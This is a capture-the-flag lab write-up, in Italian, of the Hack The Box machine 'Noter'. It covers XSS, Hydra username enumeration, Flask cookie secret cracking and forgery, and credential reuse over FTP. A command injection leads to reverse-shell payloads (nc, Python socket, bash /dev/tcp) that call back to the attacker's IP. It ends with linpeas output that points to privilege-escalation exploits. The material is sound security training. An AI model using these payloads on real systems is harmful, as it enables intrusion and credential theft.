#+title: HTB - Noter
#+author: Andra Pepe
#+date: 21/05/2022

* Foothold
** nmap
#+begin_example
$ nmap -sC -sV noter                                                                    1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:24 CEST
Nmap scan report for noter (10.10.11.160)
Host is up (0.045s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c6:53:c6:2a:e9:28:90:50:4d:0c:8d:64:88:e0:08:4d (RSA)
|   256 5f:12:58:5f:49:7d:f3:6c:bd:9b:25:49:ba:09:cc:43 (ECDSA)
|_  256 f1:6b:00:16:f7:88:ab:00:ce:96:af:a6:7e:b5:a8:39 (ED25519)
5000/tcp open  http    Werkzeug httpd 2.0.2 (Python 3.8.10)
|_http-title: Noter
|_http-server-header: Werkzeug/2.0.2 Python/3.8.10
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.56 seconds
#+end_example

#+begin_example
$ nmap -p- noter          
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:24 CEST
Nmap scan report for noter (10.10.11.160)
Host is up (0.082s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
5000/tcp open  upnp

Nmap done: 1 IP address (1 host up) scanned in 35.73 seconds
#+end_example

#+begin_example
$ sudo nmap -sU noter                                                                   1 ⚙
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-21 19:25 CEST
Stats: 0:13:19 elapsed; 0 hosts completed (1 up), 1 undergoing UDP Scan
UDP Scan Timing: About 83.48% done; ETC: 19:41 (0:02:38 remaining)
Nmap scan report for noter (10.10.11.160)
Host is up (2.2s latency).
Not shown: 930 closed udp ports (port-unreach), 50 open|filtered udp ports (no-response)
PORT      STATE    SERVICE
69/udp    filtered tftp
464/udp   filtered kpasswd5
996/udp   filtered vsinet
1070/udp  filtered gmrupdateserv
16862/udp filtered unknown
17585/udp filtered unknown
18958/udp filtered unknown
19140/udp filtered unknown
19197/udp filtered unknown
19687/udp filtered unknown
20366/udp filtered unknown
21364/udp filtered unknown
25280/udp filtered unknown
29810/udp filtered unknown
32772/udp filtered sometimes-rpc8
33354/udp filtered unknown
40732/udp filtered unknown
41081/udp filtered unknown
49196/udp filtered unknown
58640/udp filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1082.87 seconds
#+end_example

** Web server
*** XSS
Iscrivendoci come utente ~andrea:andrea~ aggiungiamo delle note e
notiamo che è possibile ottenere un *XSS* in quanto, scrivendo una nota
come segue, è stato possibile ottenere un alert poi quando viene
aperta:

#+begin_source js
title: alert

body:
</textarea><script>alert('1')</script>
#+end_source

Tuttavia il Cross-Site Scripting non ci permette di ottenere alcuna
informazione utile. 

*** Hydra
Invece, provando ad effettuare vari login, si nota che se sono
sbagliati sia username che password, il sistema stampa il messaggio
*Invalid credentials*; invece, se l'username è corretto e la password no
(ad esempio mettendo come username ~andrea~ dell'utente precedentemente
creato), il sistema stampa *Invalid login*.
Si può quindi effettuare una *enumerazione degli username* utilizzando
~Hydra~.

#+begin_example
$ hydra noter http-form-post "/login:username=^USER^&password=a:Invalid credentials" -L ~/Scrivania/gitFolder/SecLists/Usernames/xato-net-10-million-usernames.txt -p a -s 5000 
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-05-22 09:26:08
[DATA] max 16 tasks per 1 server, overall 16 tasks, 8295455 login tries (l:8295455/p:1), ~518466 tries per task
[DATA] attacking http-post-form://noter:5000/login:username=^USER^&password=a:Invalid credentials
[5000][http-post-form] host: noter   login: blue   password: a
[5000][http-post-form] host: noter   login: andrea   password: a
[STATUS] 1702.00 tries/min, 1702 tries in 00:01h, 8293753 to do in 81:13h, 16 active
[5000][http-post-form] host: noter   login: Andrea   password: a
[STATUS] 1744.33 tries/min, 5233 tries in 00:03h, 8290222 to do in 79:13h, 16 active
[5000][http-post-form] host: noter   login: Blue   password: a
[STATUS] 1667.43 tries/min, 11672 tries in 00:07h, 8283783 to do in 82:48h, 16 active
[5000][http-post-form] host: noter   login: BLUE   password: a
#+end_example

Notiamo che è presente un utente con username ~blue~.
*** JWT
Sniffando la comunicazione HTTP con ~BurpSuite~, vediamo che al momento
del login il server risponde con un *Set-Cookie* che ci indica di
assegnare al cookie *session* un valore che sembra essere un *JWT (JSON
Web Token)*. Infatti, andando sul sito https://jwt.io/, si vede che
tale cookie corrisponde ad un token ben preciso:
#+begin_example
JWT: eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kcmVhIn0.Yoni9Q.Jf0kt4bawoe07Oxo5IKHjuaDlrw

Header:
{
  "logged_in": true,
  "username": "andrea"
}

Payload:
"b���"
#+end_example

I ~JWT~ sono ottenuti tipicamente col seguente algoritmo:
#+begin_example
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  your-256-bit-secret
)
#+end_example

Se il segreto usato per l'encoding è abbastanza debole, si potrebbe
provare a farne un brute-force, in modo da poi poter fare un encoding
di un token perl'username *blue*.

#+begin_src python
#!/usr/bin/python3

import jwt;
import sys
from termcolor import colored

print (colored("Script to brute-force JWT secret token",'white'))
encoded = input("Enter encoded payload (your JWT): ")

if (len(sys.argv) < 2):
    print("Usage: python3 jwt_bruteforce.py <wordlist>\n")
    exit(1)

wordlist = sys.argv[1]

with open(wordlist) as secrets:
    for secret in secrets:
        try:
            payload = jwt.decode(encoded, secret.rstrip(), algorithms=['HS256'])
            print (colored('Success! Token decoded with ....[' + secret.rstrip() + ']','green'))
            break
        except UnicodeDecodeError:
            print(colored("skipped " + secret.rstrip(), "orange"))
        except jwt.InvalidTokenError:
            print (colored('Invalid Token .... [' + secret.rstrip() + ']','red'))
        except jwt.ExpiredSignatureError:
            print (colored('Token Expired ....[' + secret.rstrip() + ']','red'))
#+end_src
Tuttavia, il brute-force con questo codice non funziona.

Essendo che il Web Server usa ~Werkzeug~ che di solito utilizza python,
potrebbe essere che dietro c'è ~Flask~, in quanto il nome del cookie è
*session*, quello di default utilizzato da Flask.
Installiamo il tool *flask-unsign* e con il seguente comando riusciamo a
scoprire il secret:

#+begin_example
$ flask-unsign --unsign --wordlist /usr/share/wordlists/rockyou.txt --no-literal-eval --cookie "eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYW5kcmVhIn0.Yoni9Q.Jf0kt4bawoe07Oxo5IKHjuaDlrw"
[*] Session decodes to: {'logged_in': True, 'username': 'andrea'}
[*] Starting brute-forcer with 8 threads..
[+] Found secret key after 17024 attempts
b'secret123'
#+end_example

Dunque, *secret key* : ~b'secret123'~

Generiamo il cookie dell'utente *blue*:

#+begin_example
$ flask-unsign --sign --cookie "{'logged_in': True, 'username': 'blue'}" --secret 'secret123'
eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.Yon9dg.giFrORwdyYs9_IEzav38S6kJki8
#+end_example

** ftp
Nel web server, navigando con il cookie dell'utente *blue*, si è letta
la seguente nota:
#+begin_example

    Hello, Thank you for choosing our premium service. Now you are capable of
doing many more things with our application. All the information you are going
to need are on the Email we sent you. By the way, now you can access our FTP
service as well. Your username is 'blue' and the password is 'blue@Noter!'.
Make sure to remember them and delete this.  
(Additional information are included in the attachments we sent along the
Email)  
  
We all hope you enjoy our service. Thanks!  
  
ftp_admin
#+end_example

Credenziali per ftp:
*blue:blue@Noter!*

L'unica informazione utile che si riesce ad ottenere è un file in
formato pdf, al cui interno sono contenute delle istruzioni sulla
generazione delle password. In particolare, c'è scritto che le
password sono generate come segue:
*<username>@Noter!*

Essendo la nota firmata *ftp_admin*, si prova ad eseguire l'accesso ad
ftp anche con le seguenti credenziali:

*ftp_admin:ftp_admin@Noter!*

L'autenticazione ha successo e si riescono ad ottenere 2 files di
backup dell'applicazione web, da analizzare per scovare eventuali
vulnerabilità.

Inoltre, vediamo che l'utente *blue* ha una ~Dashboard VIP~ che gli
permette di fare l'import e l'export di note in markdown da uno
URL. Forse può essere sfruttato per ottenere una shell od una
RCE. Bisogna analizzarlo con maggior attenzione.

Inoltre, dal backup 5, sembrano essere presenti delle credenziali del
database (che dal backup 8 sembrano essere cambiate), che potrebbero
tornare utili in futuro.

#+begin_src python
# Config MySQL
app.config['MYSQL_HOST'] = 'localhost'
app.config['MYSQL_USER'] = 'root'
app.config['MYSQL_PASSWORD'] = 'Nildogg36'
app.config['MYSQL_DB'] = 'app'
app.config['MYSQL_CURSORCLASS'] = 'DictCursor'
#+end_src

*root:Nildogg36*

** Command Injection + Reverse Shell
Dal backup 8, si vede che è stata aggiunta la funzionalità per l'
export di note in pdf sia locale (prendendo note caricate
precedentemente e presenti del database) sia remoto, prendendo la nota
da uno URL.

Quello più facilmente sfruttabile per una *command injection* è
sicuramente quello remoto, in quanto il testo che viene iniettato nel
comando da eseguire su shell è preso direttamente dalla richiesta che
il server web effettua verso lo URL specificato per la nota.

#+begin_src python
# Export remote
@app.route('/export_note_remote', methods=['POST'])
@is_logged_in
def export_note_remote():
    if check_VIP(session['username']):
        try:
            url = request.form['url']

            status, error = parse_url(url)

            if (status is True) and (error is None):
                try:
                    r = pyrequest.get(url,allow_redirects=True)
                    rand_int = random.randint(1,10000)
                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
                    subprocess.run(command, shell=True, executable="/bin/bash")

                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):

                        return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)

                    else:
                        return render_template('export_note.html', error="Error occured while exporting the !")

                except Exception as e:
                    return render_template('export_note.html', error="Error occured!")


            else:
                return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
            
        except Exception as e:
            return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")

    else:
        abort(403)
#+end_src

Ovviamente, il punto in cui fare injection è il seguente:
#+begin_src python
command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
#+end_src

*** Reverse Shell in Node JS
Provando ad usare la seguente injection per ottenere una reverse
shell, il tutto fallisce con un *500 Internal Server Error*, in quanto è
il programma /misc/md-to-pdf.js/ fallire (anche con una nota ben formata
e senza injection).

Essendo che viene chiamato il comando ~node~, si prova a fargli valutare
uno script con il flag *-e*; tuttavia, dato il fallimento del comando
precedente, lo script non viene eseguito
#+begin_example
' 100 -e "require('child_process').exec('nc -e /bin/sh 10.10.14.92 4321')" --;
#+end_example

*** Delimiter ;
Si prova quindi a spezzare il comando in più comandi da eseguire, tra
cui una connessione verso l'attaccante per ottenere la reverse shell.
Il comando viene suddiviso in più comandi usando il *delimitatore ;*.
Ovviamente, ci si mette in ascolto con:
#+begin_example
nc -lvnp 4321
#+end_example

La nota injected è:
#+begin_example
' --; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.92",4321));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'; echo '2
#+end_example

Non funziona, quindi si prova una reverse shell in bash (prese tutte
da *Payload All The Things*):
#+begin_example
' --; bash -i >& /dev/tcp/10.10.14.92/4321 0>&1; echo '2
#+end_example

Notare che il *--* serve per dire al comando *node* che i suoi parametri
sono terminati.

Tuttavia, il tutto fallisce perché è il primo comando a fallire e il
delimitatore *;* esegue i comandi in maniera sequenziale!!!
*** Delimiter ||
Si prova quindi ad effettuare la *command injection* utilizzando il
*delimtatore ||* (OR logico), in maniera tale che i comandi vengano
eseguiti fin quando non ce ne sia uno che vada abuon fine, quindi per
bypassare l'errore causato dall'esecuzione del primo comando:

#+begin_example
' -- || bash -i >& /dev/tcp/10.10.14.92/4321 0>&1 || echo '100
#+end_example

In questo modo si riesce finalmente ad ottenere una *REVERSE SHELL
!!!*



* Privilege Escalation
** svc
La reverse shell viene ottenuta come utente *svc* presso la macchina
*noter*.

*** user.txt
6a430589598615e750e95cbbd44b054a
*** ssh
Per avere una reverse shell completa e più stabile, si genera una
coppia di chiavi ssh per poi copiarne la privata in locale e
connettendosi tramite *ssh*.

#+begin_example
ssh-keygen -t rsa

cd ~/.ssh
cat id_rsa.pub > authorized_keys
#+end_example

Copiare id_rsa (private key) in locale.

#+begin_example
chmod 400 id_rsa

ssh svc@noter -i id_rsa
#+end_example

** mysql
Si riesce ad accedere al DB usando le credenziali trovate nel backup
(*root:Nildogg36*).
#+begin_example
svc@noter:/tmp$ mysql -u root -p
Enter password: 
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 1481
Server version: 10.3.32-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| app                |
| information_schema |
| mysql              |
| performance_schema |
| test               |
+--------------------+
5 rows in set (0.002 sec)

MariaDB [(none)]> use test;
Database changed
MariaDB [test]> show tables;
Empty set (0.000 sec)

MariaDB [test]> use app;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [app]> show tables;
+---------------+
| Tables_in_app |
+---------------+
| notes         |
| users         |
+---------------+
2 rows in set (0.000 sec)

MariaDB [app]> select * from users;
+-------------+----------------+----------+-------------------------------------------------------------------------------+------+
| name        | email          | username | password                                                                      | role |
+-------------+----------------+----------+-------------------------------------------------------------------------------+------+
| Blue Wilson | blue@Noter.htb | blue     | $5$rounds=535000$76NyOgtW18b3wIqL$HZqlzNHs1SdzbAb2V6EyAnqYNskA3K.8e1iDesL5vI2 | VIP  |
+-------------+----------------+----------+-------------------------------------------------------------------------------+------+
1 row in set (0.000 sec)
#+end_example

Tuttavia, provando ad eseguire comandi dal DB, vengono eseguiti come
utente *svc* e non si riesce ad ottenere una shell da root.

** PATH
#+begin_example
svc@noter:/tmp$ echo $PATH
/home/svc/.local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
#+end_example
** ps aux
Stranamente, il comando *ps aux* fa vedere solo i processi dell'utente
con cui si è loggati:
#+begin_example
svc@noter:/tmp$ ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
svc         1211  0.0  1.2 616964 49164 ?        Ssl  04:44   0:01 PM2 v5.2.0: God Daemon (/home/svc/.pm2)
svc         1261  0.0  1.0 132312 44180 ?        Ss   04:44   0:01 /usr/bin/python3 /home/svc/app/web/app.py
svc        22861  0.0  0.2  18408  9556 ?        Ss   07:20   0:00 /lib/systemd/systemd --user
svc        22983  0.0  0.1   8404  5356 pts/0    Ss   07:20   0:00 -bash
svc        42875  0.0  0.0   8892  3296 pts/0    R+   08:00   0:00 ps aux
#+end_example

** uname -a
#+begin_example
svc@noter:/tmp$ uname -a
Linux noter 5.4.0-91-generic #102-Ubuntu SMP Fri Nov 5 16:31:28 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
#+end_example
** lsb_release -a
#+begin_example
svc@noter:/tmp$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 20.04.3 LTS
Release:	20.04
Codename:	focal
#+end_example

Vediamo che l'OS è un *Ubuntu 20.04.3*.
** linpeas
La seguente parte di linpeas sembra essere interessante:
#+begin_example
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2021-4034] PwnKit

   Details: https://www.qualys.com/2022/01/25/cve-2021-4034/pwnkit.txt
   Exposure: probable
   Tags: [ ubuntu=10|11|12|13|14|15|16|17|18|19|20|21 ],debian=7|8|9|10|11,fedora,manjaro
   Download URL: https://codeload.github.com/berdav/CVE-2021-4034/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: mint=19,[ ubuntu=18|20 ], debian=10
   Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

[+] [CVE-2021-3156] sudo Baron Samedit 2

   Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
   Exposure: probable
   Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
   Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

[+] [CVE-2021-22555] Netfilter heap out-of-bounds write

   Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
   Exposure: probable
   Tags: [ ubuntu=20.04 ]{kernel:5.8.0-*}
   Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
   Comments: ip_tables kernel module must be loaded

[+] [CVE-2017-5618] setuid screen v4.5.0 LPE

   Details: https://seclists.org/oss-sec/2017/q1/184
   Exposure: less probable
   Download URL: https://www.exploit-db.com/download/https://www.exploit-db.com/exploits/41154
#+end_example

In particolare, sembrano essere interessanti gli exploit *sudo Baron
Samedit*, legati ad una versione di ~sudo~ non recentissima (sudo
v1.8.31). Potrebbero permettere una privilege escalation.

Essendo il sistema un *Ubuntu 20.04.3*, entrambi gli exploit suggeriti di questa
vulnerabilità possono essere testati.
